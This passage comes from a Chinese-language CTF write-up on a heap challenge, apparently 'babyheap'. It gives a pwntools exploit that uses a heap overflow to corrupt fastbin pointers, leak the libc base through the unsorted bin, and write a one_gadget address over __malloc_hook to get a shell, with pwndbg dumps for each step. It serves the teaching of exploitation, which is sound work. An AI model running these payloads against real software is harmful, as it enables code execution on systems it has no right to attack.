class="number">4</span>)</span><br><span class="line"></span><br><span class="line">#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了</span><br><span class="line">#main_arena与libc偏移为<span class="number">0x3c4b20</span>(文末有工具算)</span><br><span class="line">#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移</span><br><span class="line">unsorted_offset_mainarena=unsorted_offset_arena(<span class="number">5</span>)#这函数还不太明白</span><br><span class="line">unsorted_addr=u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base=unsorted_addr<span class="number">-0x3c4b20</span>-unsorted_offset_mainarena</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">&quot;libc_base: &quot;</span>+hex(libc_base))</span><br><span class="line">#此时因为fastbins中没有了,所以从unsortedbins中找</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">#index2还是指向index4那个地方我们可以先释放index4</span><br><span class="line"><span class="built_in">free</span>(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址</span><br><span class="line">#但问题是我们去申请的时候会检查size是不是 fakefd + <span class="number">8</span> == 当前fastbin的大小</span><br><span class="line">#这个地址是main_arena<span class="number">-0x40</span>+<span class="number">0xd</span>,具体看后面图片解释</span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">#这时候再去申请两个,第一个是给前面<span class="built_in">free</span>的index4,第二个就会分配到malloc_hook处</span><br><span class="line">alloc(<span class="number">0x60</span>)#index4</span><br><span class="line">alloc(<span class="number">0x60</span>)#index6</span><br><span class="line"></span><br><span class="line">#然后往malloc_hook上写one_gadget的地址</span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(libc_base+<span class="number">0x4527a</span>)</span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line">#再申请一下触发one_gadget</span><br><span class="line">alloc(<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>从上面的内容可以看出，主要的漏洞是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须要有一些泄漏才可以控制程序的流程。基本利用思路如下：</p>
<ul>
<li>利用 unsorted bin 地址泄漏 libc 基地址。（用 unsortedbin 的原因之后再说）</li>
<li>利用 fastbin attack 中的 Arbitrary Alloc 技术将 chunk 分配到 malloc_hook 附近。</li>
</ul>
<h2 id="1、leak-libc-addr"><a href="#1、leak-libc-addr" class="headerlink" title="1、leak libc addr"></a>1、leak libc addr</h2><h3 id="1-1、模仿程序的功能"><a href="#1-1、模仿程序的功能" class="headerlink" title="1-1、模仿程序的功能"></a>1-1、模仿程序的功能</h3><p>要做 pwn 中的堆题，首先肯定要写出可以自动化发送的脚本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line"><span class="function">    p.<span class="title">recvuntil</span><span class="params">(<span class="string">&quot;Command: &quot;</span>)</span></span></span><br><span class="line"><span class="function">    p.<span class="title">sendline</span><span class="params">(<span class="string">&quot;1&quot;</span>)</span></span></span><br><span class="line"><span class="function">    p.<span class="title">recvuntil</span><span class="params">(<span class="string">&quot;Size: &quot;</span>)</span></span></span><br><span class="line"><span class="function">    p.<span class="title">sendline</span><span class="params">(str(size))</span></span></span><br><span class="line"><span class="function">def <span class="title">fill</span><span class="params">(idx, content)</span>:</span></span><br><span class="line"><span class="function">    p.<span class="title">recvuntil</span><span class="params">(<span class="string">&quot;Command: &quot;</span>)</span></span></span><br><span class="line"><span class="function">    p.<span class="title">sendline</span><span class="params">(<span class="string">&quot;2&quot;</span>)</span></span></span><br><span class="line"><span class="function">    p.<span class="title">recvuntil</span><span class="params">(<span class="string">&quot;Index: &quot;</span>)</span></span></span><br><span class="line"><span class="function">    p.<span class="title">sendline</span><span class="params">(str(idx))</span></span></span><br><span class="line"><span class="function">    p.<span class="title">recvuntil</span><span class="params">(<span class="string">&quot;Size: &quot;</span>)</span></span></span><br><span class="line"><span class="function">    p.<span class="title">sendline</span><span class="params">(str(len(content)))</span></span></span><br><span class="line"><span class="function">    p.<span class="title">recvuntil</span><span class="params">(<span class="string">&quot;Content: &quot;</span>)</span></span></span><br><span class="line"><span class="function">    p.<span class="title">send</span><span class="params">(content)</span></span></span><br><span class="line"><span class="function">def <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line"><span class="function">    p.<span class="title">recvuntil</span><span class="params">(<span class="string">&quot;Command: &quot;</span>)</span></span></span><br><span class="line"><span class="function">    p.<span class="title">sendline</span><span class="params">(<span class="string">&quot;3&quot;</span>)</span></span></span><br><span class="line"><span class="function">    p.<span class="title">recvuntil</span><span class="params">(<span class="string">&quot;Index: &quot;</span>)</span></span></span><br><span class="line"><span class="function">    p.<span class="title">sendline</span><span class="params">(str(idx))</span></span></span><br><span class="line"><span class="function">def <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line"><span class="function">    p.<span class="title">recvuntil</span><span class="params">(<span class="string">&quot;Command: &quot;</span>)</span></span></span><br><span class="line"><span class="function">    p.<span class="title">sendline</span><span class="params">(<span class="string">&quot;4&quot;</span>)</span></span></span><br><span class="line"><span class="function">    p.<span class="title">recvuntil</span><span class="params">(<span class="string">&quot;Index: &quot;</span>)</span></span></span><br><span class="line"><span class="function">    p.<span class="title">sendline</span><span class="params">(str(idx))</span></span></span><br><span class="line"><span class="function">    p.<span class="title">recvline</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">return</span> p.<span class="title">recvline</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>这 4 个函数分别对应程序的四个主要功能，这里就不多说了。</p>
<h3 id="1-2、申请-5-个-chunk"><a href="#1-2、申请-5-个-chunk" class="headerlink" title="1-2、申请 5 个 chunk"></a>1-2、申请 5 个 chunk</h3><p>由于我们希望使用 unsorted bin 来泄漏 libc 基地址，<strong>所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能被回收到 fastbin chunk，也不能和 top chunk 相邻。因为后者在不是 fastbin 的情况下，会被合并到 top chunk 中。</strong>具体设计如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#paylaod：</span></span><br><span class="line">alloc(<span class="number">0x10</span>)#<span class="function">index0</span></span><br><span class="line"><span class="function"><span class="title">alloc</span><span class="params">(<span class="number">0x10</span>)</span>#index1</span></span><br><span class="line"><span class="function"><span class="title">alloc</span><span class="params">(<span class="number">0x10</span>)</span>#index2</span></span><br><span class="line"><span class="function"><span class="title">alloc</span><span class="params">(<span class="number">0x10</span>)</span>#index3</span></span><br><span class="line"><span class="function"><span class="title">alloc</span><span class="params">(<span class="number">0x80</span>)</span>#index4</span></span><br></pre></td></tr></table></figure>

<p>执行完此 payload 之后的 heap 情况如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">50</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index0</span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index1</span><br><span class="line"><span class="number">0x555555757030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index2</span><br><span class="line"><span class="number">0x555555757050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index3</span><br><span class="line"><span class="number">0x555555757070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span> #index4</span><br><span class="line">......（省略内容均为空）</span><br><span class="line"><span class="number">0x555555757110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020ef1</span> #top_chunk</span><br></pre></td></tr></table></figure>

<p>此时程序结构体中的情况：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5fcead98720</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5fcead98730</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000010</span></span><br><span class="line">    			#index0</span><br><span class="line"><span class="number">0x5fcead98740</span>:	<span class="number">0x0000555555757010</span>	<span class="number">0x0000000000000001</span></span><br><span class="line">    								#index1</span><br><span class="line"><span class="number">0x5fcead98750</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x0000555555757030</span></span><br><span class="line"><span class="number">0x5fcead98760</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000010</span></span><br><span class="line">     			#index2</span><br><span class="line"><span class="number">0x5fcead98770</span>:	<span class="number">0x0000555555757050</span>	<span class="number">0x0000000000000001</span></span><br><span class="line">    								#index3</span><br><span class="line"><span class="number">0x5fcead98780</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x0000555555757070</span></span><br><span class="line"><span class="number">0x5fcead98790</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000080</span></span><br><span class="line">    			#index4</span><br><span class="line"><span class="number">0x5fcead987a0</span>:	<span class="number">0x0000555555757090</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5fcead987b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<h3 id="1-3、free-创建的-index1-和-index2"><a href="#1-3、free-创建的-index1-和-index2" class="headerlink" title="1-3、free 创建的 index1 和 index2"></a>1-3、free 创建的 index1 和 index2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#free两个,这时候会放到fastbins中,而且因为是后进的,所以</span></span><br><span class="line"><span class="meta">#fastbin[0]-&gt;index2-&gt;index1-&gt;NULL</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>执行此部分 payload，来看一下堆状况：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">50</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index0</span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index1</span><br><span class="line"><span class="number">0x555555757030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index2</span><br><span class="line"><span class="number">0x555555757050</span>:	<span class="number">0x0000555555757020</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    			<span class="meta">#fd指针指向index1的起始地址</span></span><br><span class="line"><span class="number">0x555555757060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index3</span><br><span class="line"><span class="number">0x555555757070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span> #index4</span><br><span class="line"><span class="number">0x555555757090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x555555757110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020ef1</span> #top_chunk</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>此时的 bin 和 main_arena 情况：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0000555555757020</span>-&gt;<span class="number">0x555555757040</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx &amp;main_arena</span><br><span class="line"><span class="number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000555555757040</span> #index2</span><br><span class="line"><span class="number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="number">16</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="number">32</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="number">48</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="number">64</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="number">80</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000555555757110</span> #top_chunk</span><br><span class="line"><span class="number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="number">96</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="number">112</span>&gt;:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x00007ffff7dd1b88</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>程序的结构体状况如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5fcead98730</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000010</span></span><br><span class="line">    			#index0</span><br><span class="line"><span class="number">0x5fcead98740</span>:	<span class="number">0x0000555555757010</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    								#index1（chunk_flag置零）</span><br><span class="line"><span class="number">0x5fcead98750</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">                #chunk_content_size置零   #chunk_data_ptr置空</span><br><span class="line"><span class="number">0x5fcead98760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">     			#index2（chunk_flag置零）  #chunk_data_size置零</span><br><span class="line"><span class="number">0x5fcead98770</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000001</span></span><br><span class="line">    			#chunk_data_ptr置空  #index3</span><br><span class="line"><span class="number">0x5fcead98780</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x0000555555757070</span></span><br><span class="line"><span class="number">0x5fcead98790</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000080</span></span><br><span class="line">    			#index4</span><br><span class="line"><span class="number">0x5fcead987a0</span>:	<span class="number">0x0000555555757090</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5fcead987b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意：chunk_content_size 和 chunk 中的 size 字段是不相同的，千万不要搞混！！！</strong> &gt; <strong>程序在 Allocate 时是根据 content_size 来创建堆块的，而在 fill 时 input 函数并不会修改 content_size 和 chunk 的 size 域。</strong></p>
</blockquote>
<h3 id="1-4、对-index0-进行-fill-操作，溢出修改-index2-的-fd-指针"><a href="#1-4、对-index0-进行-fill-操作，溢出修改-index2-的-fd-指针" class="headerlink" title="1-4、对 index0 进行 fill 操作，溢出修改 index2 的 fd 指针"></a>1-4、对 index0 进行 fill 操作，溢出修改 index2 的 fd 指针</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"><span class="meta">#exp中fill函数定义如下：</span></span><br><span class="line">def fill(idx, content):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">--------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>还记得上面提到的程序漏洞吗？<br>**第一次执行 Allocate 函数时 chunk_content_size 是我们指定的，但是 fill 的时候并没有将新的 chunk_content_size 写入到结构体中，并且之前 alloc chunk 时指定的堆块 size 大小没有发生改变，所以这里就出现了任意堆溢出的情形。<br>**<br>这一小段 payload 的目的是：通过 fill index0 溢出修改 index2 的 fd 指针为 index4 的地址，此处的 payload 只用修改 fd 的最后一个字节为 0x80 即可。**<br>执行 payload 之后的内存空间如下：</p>
<blockquote>
<p>chunk2-&gt;fd 已成功修改为 chunk4 的起始地址<strong>（这个起始地址是指向 chunk header 的）</strong></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">50</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index0</span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">                <span class="meta">#payload从这里开始修改堆块内容</span></span><br><span class="line"><span class="number">0x555555757020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index1</span><br><span class="line"><span class="number">0x555555757030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index2（fastbin）</span><br><span class="line"><span class="number">0x555555757050</span>:	<span class="number">0x0000555555757080</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    			#此处的fd指针已经被修改</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">执行payload前原来的内容为：</span><br><span class="line"><span class="number">0x555555757050</span>:	<span class="number">0x0000555555757020</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"><span class="number">0x555555757060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index3</span><br><span class="line"><span class="number">0x555555757070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span> #index4（fastbin）</span><br><span class="line"><span class="number">0x555555757090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x555555757110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020ef1</span> #top_chunk</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此时结构体状况未发生改变。</p>
</blockquote>
<h3 id="1-5、对-index3-进行-fill，将-index4-的大小修改为-0x21"><a href="#1-5、对-index3-进行-fill，将-index4-的大小修改为-0x21" class="headerlink" title="1-5、对 index3 进行 fill，将 index4 的大小修改为 0x21"></a>1-5、对 index3 进行 fill，将 index4 的大小修改为 0x21</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#然后再通过index3去进行写入,把index4的大小改成<span class="number">0x21</span></span><br><span class="line">#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fastbin的范围内（请注意这点)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index0</span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index1</span><br><span class="line"><span class="number">0x555555757030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index2（fastbin）</span><br><span class="line"><span class="number">0x555555757050</span>:	<span class="number">0x0000555555757080</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index3</span><br><span class="line"><span class="number">0x555555757070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index4（fastbin）</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">执行payload前原来的内容为：</span><br><span class="line"><span class="number">0x555555757080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span> #index4（fastbin）</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x555555757110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020ef1</span> #top_chunk</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x555555757180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p><strong>再次强调，在申请 fastbin 中内存时，会检查被释放堆块的 size（大小）是否在 fastbin 的范围内，如果不在，程序则异常退出，这有关于 fastbin 的机制。</strong></p>
<blockquote>
<p>结构体状况未发生改变。</p>
</blockquote>
<h3 id="1-6、申请-index4"><a href="#1-6、申请-index4" class="headerlink" title="1-6、申请 index4"></a>1-6、申请 index4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#改好index4的大小之后去申请两次，这样就把原来的fastbin中的给申请出来了</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">#申请成功之后index2就指向index4</span><br></pre></td></tr></table></figure>

<p>首先是两个 malloc，前面 fastbin 里一开始是两个 chunk，分别为 index2-&gt;index1，后来我们修改 index2-&gt;fd 为 index4 的地址，fastbin 里变为 index2-&gt;index4。第一个 malloc 会先分配 index2 给我们（fastbin 分配原则是 LIFO 即后进先出），第二个 malloc 会将 index4 分配给我们。<br>看一下堆：</p>
